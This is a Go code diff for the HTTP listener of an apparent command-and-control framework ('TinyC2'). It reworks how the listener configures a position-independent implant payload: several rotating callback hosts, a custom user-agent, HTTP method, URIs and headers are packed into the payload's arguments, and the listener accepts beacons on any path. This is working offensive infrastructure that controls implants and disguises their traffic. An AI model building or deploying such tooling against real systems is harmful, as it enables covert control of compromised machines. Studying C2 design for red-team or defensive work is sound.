@@ -1,9 +1,8 @@
+// Package listener
 package listener
 
 import (
-	"bytes"
 	"context"
-	"encoding/binary"
 	"fmt"
 	"net"
 	"net/http"
@@ -12,43 +11,54 @@ import (
 
 	"github.com/0xPrimo/TinyC2/sdk"
 
+	"http/pkg/packer"
+
 	"github.com/gin-gonic/gin"
 	"github.com/goccy/go-yaml"
 )
 
-type HttpListener struct {
+type HTTPListener struct {
 	Name   string
 	Engine sdk.IEngine
 	Server *http.Server
-	Config HttpConfig
+	Config HTTPConfig
 }
 
-type HttpConfig struct {
-	ConnHost string `yaml:"connhost"`
-	ConnPort uint16 `yaml:"connport"`
-	BindHost string `yaml:"bindhost"`
-	BindPort uint16 `yaml:"bindport"`
+type Host struct {
+	IP   string `yaml:"ip"`
+	Port uint16 `yaml:"port"`
 }
 
-func NewHttpListener(engine sdk.IEngine, name string, config string) (sdk.IListener, error) {
+type HTTPConfig struct {
+	BindHost  string            `yaml:"bindhost"`
+	BindPort  uint16            `yaml:"bindport"`
+	Hosts     []Host            `yaml:"hosts"`
+	Rotation  string            `yaml:"rotation-strategy"`
+	UserAgent string            `yaml:"user-agent"`
+	Method    string            `yaml:"method"`
+	Uris      []string          `yaml:"uris"`
+	Headers   map[string]string `yaml:"headers"`
+}
+
+func NewHTTPListener(engine sdk.IEngine, name string, config string) (sdk.IListener, error) {
 	data, err := os.ReadFile(config)
 	if err != nil {
 		return nil, err
 	}
 
-	var cfg HttpConfig
+	var cfg HTTPConfig
 	if err := yaml.Unmarshal(data, &cfg); err != nil {
 		return nil, err
 	}
 
-	return &HttpListener{
+	return &HTTPListener{
 		Name:   name,
 		Engine: engine,
 		Config: cfg,
 	}, nil
 }
 
-func (h *HttpListener) Start() error {
+func (h *HTTPListener) Start() error {
 	addr := fmt.Sprintf("%s:%d", h.Config.BindHost, h.Config.BindPort)
 	err := IsValidAddress(addr)
 	if err != nil {
@@ -58,7 +68,7 @@ func (h *HttpListener) Start() error {
 	gin.SetMode(gin.ReleaseMode)
 
 	r := gin.New()
-	r.POST("/", CreateHttpHandler(h))
+	r.POST("/*any", CreateHTTPHandler(h))
 
 	h.Server = &http.Server{
 		Addr:    addr,
@@ -74,7 +84,7 @@ func (h *HttpListener) Start() error {
 	return nil
 }
 
-func (h *HttpListener) Stop() error {
+func (h *HTTPListener) Stop() error {
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancel()
 
@@ -85,37 +95,48 @@ func (h *HttpListener) Stop() error {
 	return nil
 }
 
-func (h *HttpListener) MakePic(id uint32) ([]byte, error) {
-	// read plugin pic
+func (h *HTTPListener) MakePic(id uint32) ([]byte, []byte, error) {
+	configArray := []any{}
+
+	configArray = append(configArray, uint32(id))
+	configArray = append(configArray, h.Config.UserAgent)
+	configArray = append(configArray, h.Config.Method)
+
+	switch h.Config.Rotation {
+	case "round-robin":
+		configArray = append(configArray, uint16(1))
+	default:
+		configArray = append(configArray, uint16(0))
+	}
+
+	configArray = append(configArray, uint16(len(h.Config.Uris)))
+	configArray = append(configArray, uint16(len(h.Config.Headers)))
+	configArray = append(configArray, uint16(len(h.Config.Hosts)))
+
+	for _, host := range h.Config.Hosts {
+		configArray = append(configArray, host.IP)
+		configArray = append(configArray, uint16(host.Port))
+	}
+
+	for key, value := range h.Config.Headers {
+		configArray = append(configArray, key+": "+value+"\r\n")
+	}
+
+	for _, uri := range h.Config.Uris {
+		configArray = append(configArray, uri)
+	}
+
+	picargs, err := packer.Pack(configArray...)
+	if err != nil {
+		return nil, nil, fmt.Errorf("failed to pack configurations: %v", err)
+	}
+
 	data, err := os.ReadFile("plugins/http/bin/channel.x64.pic")
 	if err != nil {
-		return nil, fmt.Errorf("failed to read pic: %w", err)
+		return nil, nil, fmt.Errorf("failed to read pic: %w", err)
 	}
 
-	// patch channel id
-	offset := bytes.Index(data, []byte("LSID"))
-	if offset == -1 {
-		return nil, fmt.Errorf("string 'LSID' not found in pic")
-	}
-	binary.LittleEndian.PutUint32(data[offset:offset+4], id)
-
-	// patch host
-	offset = bytes.Index(data, []byte("123.123.123.123"))
-	if offset == -1 {
-		return nil, fmt.Errorf("string '123.123.123.123' not found in pic")
-	}
-	copy(data[offset:offset+len(h.Config.ConnHost)], []byte(h.Config.ConnHost))
-	data[offset+len(h.Config.ConnHost)] = 0
-
-	// patch port
-	offset = bytes.Index(data, []byte("PORT"))
-	if offset == -1 {
-		return nil, fmt.Errorf("string 'PORT' not found in pic")
-	}
-	binary.LittleEndian.PutUint16(data[offset:offset+2], h.Config.ConnPort)
-
-	// return pic
-	return data, nil
+	return data, picargs, nil
 }
 
 func IsValidAddress(address string) error {
